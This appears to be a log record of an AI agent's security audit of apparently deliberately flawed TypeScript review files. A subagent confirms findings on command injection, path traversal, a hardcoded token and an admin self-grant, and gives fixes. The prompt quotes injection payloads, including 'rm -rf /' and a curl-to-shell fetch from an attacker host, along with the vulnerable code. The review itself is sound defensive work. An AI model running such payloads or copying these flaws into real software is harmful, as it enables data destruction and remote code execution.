{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01TLjtv4aRuU7rSqe7WdCsdb","type":"tool_result","content":[{"type":"text","text":"All findings confirmed against source. Lines verified: exec at 35, curl exec at 69, fsSize at 46, hardcoded token at 20 / plaintext URL at 68, swallowed catch at 55-60, dep pin comment at 9-13. Handler: JSON.parse at 17, admin self-grant at 21.\n\n### Critical\n\n1. review-src/disk-info.ts:35: [A03] `exec('du -sh ' + path)` concatenates attacker `query.mountPath` into a shell string (`/; rm -rf /`). Use `execFile('du', ['-sh', path])`.\n2. review-src/disk-info.ts:69: [A03] `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed))` -- single-quote/backtick breakout from `du`-derived `parsed`. Use `execFile`/`fetch` with arg array.\n3. review-src/disk-info.ts:46: [A01] unvalidated `query.mountPath` to `fsSize` enables path traversal (`../../etc`). Canonicalize and allow-list permitted mount prefixes.\n4. review-src/disk-info.ts:20: [A02] live-format secret `API_TOKEN` hardcoded, committed to history. Move to env/secret store and rotate the leaked token.\n8. review-src/handler.ts:21: [A01] `payload.admin === true` grants admin from attacker body with no auth check. Derive role from authenticated session, never request payload.\n\n### Important\n\n5. review-src/disk-info.ts:68: [A02] `API_TOKEN` sent over `http://` query param -- leaks in transit, proxy logs, `ps`. Use `https://` and an `Authorization` header.\n9. review-src/handler.ts:17: [A03] `JSON.parse(req.body)` unguarded -- malformed body throws uncaught SyntaxError (DoS). Wrap in try/catch, return 400, schema-validate.\n\n### Suggestions\n\n6. review-src/disk-info.ts:55-60: [A09] `try/catch (_)` discards parse/cache failures silently, hiding exploitation attempts. Log errors with context to the monitoring sink.\n\n### Questions\n\n7. review-src/disk-info.ts:9-13: [A06] `systeminformation@3.42.0` documented pin predates command-injection advisories. Unresolved hedge: dep documented \"not installed\" (unverified). Verify GHSA/OSV advisories before relying.\n<verify_request question=\"Does systeminformation@3.42.0 have published GHSA/OSV command-injection advisories patched in later majors?\" class=\"2-S\" anchor_target=\"pv-systeminformation-3-42-0-cves\" severity=\"suggestion\"/>\n\n### Per-finding validation\n\nValidation of Finding 8: confirmed Critical (executor rated handler.ts as sibling/uncategorized). If `handleRequest` gates `getDiskUsage`, this self-declared admin bypass is the unauthenticated entry that chains directly into Findings 1-3, turning the whole disk-info module into an unauthenticated RCE surface.\n\nValidation of Finding 5: held Important not Critical -- plaintext leak requires network-position to exploit, whereas hardcoded source secret (Finding 4) is the higher-certainty exposure. Both share one root cause.\n\n### Threat Patterns\n\nFindings 8 -> 1/2/3 form the primary chain: the handler.ts admin self-grant (8) provides an unauthenticated path that, if it gates `getDiskUsage`, reaches command injection (1), curl-exec injection (2), and path traversal (3) -- unauthenticated RCE. Findings 1 and 2 also chain internally: `du` stdout from injection (1) flows into `cacheResult` -> `writeCache` exec (2), a second injection sink with no intervening validation. Findings 4 and 5 are one credential cluster (hardcoded + plaintext transport, shared token); compromise of either yields the live `sk_live_*` secret. Finding 6 (swallowed errors) blinds operators to all of the above being exploited.\n\n### Missed surfaces (optional)\n\nAdjacent: `getDiskUsage` is fire-and-forget (`exec` callback runs after the function returns `fsSize`), so injection executes even when the caller ignores the result -- no response-gating mitigation possible."},{"type":"text","text":"agentId: ac76d51ca96ba4959 (use SendMessage with to: 'ac76d51ca96ba4959' to continue this agent)\n<usage>subagent_tokens: 38811\ntool_uses: 2\nduration_ms: 26425</usage>"}]}]},"parent_tool_use_id":null,"session_id":"61777dba-f351-478b-9ec6-9ec3ba8900e0","uuid":"f2792e75-df3c-41dc-a5c7-16b586444e35","timestamp":"2026-06-08T09:21:59.802Z","tool_use_result":{"status":"completed","prompt":"## Review Scope\n\nSecurity audit of `review-src/disk-info.ts` (Node.js/TypeScript disk-information module) and its sibling `review-src/handler.ts` (HTTP request handler). The modules handle attacker-controlled mount paths, execute shell commands, call an external cache service, and process incoming HTTP request bodies.\n\n## Threat Model Context\n\n**Assets protected:** Developer/CI machine executing this code; internal cache service at `cache.internal`; API credentials embedded in source; filesystem access on the host running the module.\n\n**Attacker profile:** An attacker who can influence the `query.mountPath` field (external input to `getDiskUsage`) or the `req.body` field (external input to `handleRequest`). In a REST or IPC scenario, this is any authenticated (or unauthenticated) caller.\n\n**Blast radius:**\n- Successful command injection via `exec` = arbitrary OS command execution on the server/CI host.\n- Path traversal via `fsSize` = read access to arbitrary filesystem paths outside the intended mount scope.\n- Leaked API token = attacker gains the `sk_live_*` credential; it travels in plaintext over HTTP and is embedded in source history.\n- Swallowed errors = security-relevant failures (parse errors, cache write failures) are invisible to operators.\n\n## Pre-Verified Package Behavior Claims (if any)\n\n(None applicable -- `systeminformation@3.42.0` is noted in a comment as \"review material only; not installed\"; no `<pre_verified>` block is synthesized for an uninstalled dep.)\n\n## Findings\n\nFinding 1: Command injection in `exec` call\n- File: `review-src/disk-info.ts:35`\n- Severity (initial): Critical\n- OWASP category: A03 Injection\n- Description: `query.mountPath` is attacker-controlled and concatenated directly into a shell command string passed to `exec`. An input of `\"/; rm -rf /\"` or `\"/ && curl attacker.com | sh\"` executes arbitrary OS commands. There is no input validation, no allow-list, no use of `execFile`/`spawn` with argument arrays.\n- Code context:\n```typescript\nexec('du -sh ' + path, (err, stdout) => {\n  if (err) {\n    return;\n  }\n  cacheResult(stdout);\n});\n```\n\nFinding 2: Second command injection via `curl` exec in `writeCache`\n- File: `review-src/disk-info.ts:69`\n- Severity (initial): Critical\n- OWASP category: A03 Injection\n- Description: `writeCache` calls `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\")`. The JSON-stringified `parsed` value is attacker-influenced (it originates from `stdout` of the `du` command, itself attacker-controlled via Finding 1). Single quotes, shell metacharacters, or backtick sequences in the JSON can break out of the `-d '...'` argument and inject additional shell commands. The `void` discard also means errors are silently swallowed.\n- Code context:\n```typescript\nfunction writeCache(parsed: unknown): void {\n  const url = 'http://cache.internal/store?token=' + API_TOKEN;\n  void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n}\n```\n\nFinding 3: Path traversal into `fsSize`\n- File: `review-src/disk-info.ts:46`\n- Severity (initial): Critical\n- OWASP category: A01 Broken Access Control\n- Description: The same unvalidated `query.mountPath` is passed directly to `fsSize(path)`. An attacker can supply `\"../../etc\"` or any absolute path outside the intended mount scope to read filesystem metadata for arbitrary paths. No canonicalization, no prefix check, no allow-list of permitted mount points.\n- Code context:\n```typescript\nconst size = await fsSize(path);\nreturn { path, size };\n```\n\nFinding 4: Hardcoded secret transmitted over plaintext HTTP in query parameter\n- File: `review-src/disk-info.ts:20` (hardcoded) and `disk-info.ts:68` (plaintext transmission)\n- Severity (initial): Critical\n- OWASP category: A02 Cryptographic Failures / A07 Identification and Authentication Failures\n- Description: `API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1'` is a live-format secret hardcoded in source. It is committed to version history and visible to every repo reader. The same token is appended as a query parameter (`?token=`) in a plain `http://` URL, exposing it in transit (no TLS), in proxy/server logs (query strings are logged by default), and in curl's process argument list (visible in `ps` output).\n- Code context:\n```typescript\nconst API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n// ...\nconst url = 'http://cache.internal/store?token=' + API_TOKEN;\n```\n\nFinding 5: Vulnerable dependency pin `systeminformation@3.42.0`\n- File: `review-src/disk-info.ts:10-13` (comment block documenting the pin)\n- Severity (initial): Important\n- OWASP category: A06 Vulnerable and Outdated Components\n- Description: The file documents that `systeminformation@3.42.0` is the intended dependency. Per the comment, this predates command-injection advisories patched in later majors. Using a pinned pre-patch version of a library that passes user-controlled strings to shell commands amplifies the command-injection risk from Finding 1: even if the caller-side injection is fixed, the library itself may have its own command-injection surface at this version. (Note: this dep is documented as review material and is not currently installed; the finding concerns the documented intent to use this pin.)\n- Code context:\n```typescript\n// Dependency pins (review material only; not installed):\n//   \"systeminformation\": \"3.42.0\"  -- DEFECT (vulnerable dep pin): this range\n//   predates the command-injection advisories patched in later majors\n```\n\nFinding 6: Security-relevant errors silently swallowed (OWASP A09)\n- File: `review-src/disk-info.ts:55-60`\n- Severity (initial): Important\n- OWASP category: A09 Security Logging and Monitoring Failures\n- Description: The `cacheResult` function wraps `JSON.parse` + `writeCache` in a try/catch that discards every error with no logging, no re-throw, and no alerting. If the parse fails (e.g., attacker crafts `du` output to be unparseable JSON) or `writeCache` throws (network failure, injection-triggered crash), the failure is invisible. This eliminates the ability to detect exploitation attempts or availability failures.\n- Code context:\n```typescript\ntry {\n  const parsed = JSON.parse(stdout);\n  writeCache(parsed);\n} catch (_) {\n  // swallowed\n}\n```\n\n## Sibling File Security Findings (handler.ts)\n\nIn addition to the above findings in `disk-info.ts`, the sibling `review-src/handler.ts` has two security-relevant issues:\n\n- **Unguarded `JSON.parse` of untrusted input (handler.ts:17)**: `JSON.parse(req.body)` has no try/catch; a malformed body throws an uncaught SyntaxError that propagates unhandled. This is an availability/denial vector (A03-adjacent -- input not validated at the boundary).\n- **Authorization bypass via payload self-declaration (handler.ts:21)**: `if (payload.admin === true) return processAdmin(payload)` grants admin privileges based solely on the attacker-controlled request body. There is no server-side authentication check. This is A01 Broken Access Control -- any caller can elevate to admin by including `\"admin\": true` in the body.\n\n## Request\n\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Identify attack chains across findings (especially between the two command-injection surfaces and the hardcoded-credential/plaintext-transport cluster). Note whether the handler.ts authorization bypass meaningfully changes the threat model for the disk-info module (if the handler gates getDiskUsage, the bypass is an escalation path to Findings 1-3). Flag any cross-cutting patterns or additional findings I may have missed.","agentId":"ac76d51ca96ba4959","agentType":"lz-advisor:security-reviewer","content":[{"type":"text","text":"All findings confirmed against source. Lines verified: exec at 35, curl exec at 69, fsSize at 46, hardcoded token at 20 / plaintext URL at 68, swallowed catch at 55-60, dep pin comment at 9-13. Handler: JSON.parse at 17, admin self-grant at 21.\n\n### Critical\n\n1. review-src/disk-info.ts:35: [A03] `exec('du -sh ' + path)` concatenates attacker `query.mountPath` into a shell string (`/; rm -rf /`). Use `execFile('du', ['-sh', path])`.\n2. review-src/disk-info.ts:69: [A03] `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed))` -- single-quote/backtick breakout from `du`-derived `parsed`. Use `execFile`/`fetch` with arg array.\n3. review-src/disk-info.ts:46: [A01] unvalidated `query.mountPath` to `fsSize` enables path traversal (`../../etc`). Canonicalize and allow-list permitted mount prefixes.\n4. review-src/disk-info.ts:20: [A02] live-format secret `API_TOKEN` hardcoded, committed to history. Move to env/secret store and rotate the leaked token.\n8. review-src/handler.ts:21: [A01] `payload.admin === true` grants admin from attacker body with no auth check. Derive role from authenticated session, never request payload.\n\n### Important\n\n5. review-src/disk-info.ts:68: [A02] `API_TOKEN` sent over `http://` query param -- leaks in transit, proxy logs, `ps`. Use `https://` and an `Authorization` header.\n9. review-src/handler.ts:17: [A03] `JSON.parse(req.body)` unguarded -- malformed body throws uncaught SyntaxError (DoS). Wrap in try/catch, return 400, schema-validate.\n\n### Suggestions\n\n6. review-src/disk-info.ts:55-60: [A09] `try/catch (_)` discards parse/cache failures silently, hiding exploitation attempts. Log errors with context to the monitoring sink.\n\n### Questions\n\n7. review-src/disk-info.ts:9-13: [A06] `systeminformation@3.42.0` documented pin predates command-injection advisories. Unresolved hedge: dep documented \"not installed\" (unverified). Verify GHSA/OSV advisories before relying.\n<verify_request question=\"Does systeminformation@3.42.0 have published GHSA/OSV command-injection advisories patched in later majors?\" class=\"2-S\" anchor_target=\"pv-systeminformation-3-42-0-cves\" severity=\"suggestion\"/>\n\n### Per-finding validation\n\nValidation of Finding 8: confirmed Critical (executor rated handler.ts as sibling/uncategorized). If `handleRequest` gates `getDiskUsage`, this self-declared admin bypass is the unauthenticated entry that chains directly into Findings 1-3, turning the whole disk-info module into an unauthenticated RCE surface.\n\nValidation of Finding 5: held Important not Critical -- plaintext leak requires network-position to exploit, whereas hardcoded source secret (Finding 4) is the higher-certainty exposure. Both share one root cause.\n\n### Threat Patterns\n\nFindings 8 -> 1/2/3 form the primary chain: the handler.ts admin self-grant (8) provides an unauthenticated path that, if it gates `getDiskUsage`, reaches command injection (1), curl-exec injection (2), and path traversal (3) -- unauthenticated RCE. Findings 1 and 2 also chain internally: `du` stdout from injection (1) flows into `cacheResult` -> `writeCache` exec (2), a second injection sink with no intervening validation. Findings 4 and 5 are one credential cluster (hardcoded + plaintext transport, shared token); compromise of either yields the live `sk_live_*` secret. Finding 6 (swallowed errors) blinds operators to all of the above being exploited.\n\n### Missed surfaces (optional)\n\nAdjacent: `getDiskUsage` is fire-and-forget (`exec` callback runs after the function returns `fsSize`), so injection executes even when the caller ignores the result -- no response-gating mitigation possible."}],"totalDurationMs":26425,"totalTokens":38811,"totalToolUseCount":2,"usage":{"input_tokens":2,"cache_creation_input_tokens":2526,"cache_read_input_tokens":34823,"output_tokens":1460,"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":2526},"inference_geo":"not_available","iterations":[],"speed":"standard"},"toolStats":{"readCount":2,"searchCount":0,"bashCount":0,"editFileCount":0,"linesAdded":0,"linesRemoved":0,"otherToolCount":0}}}
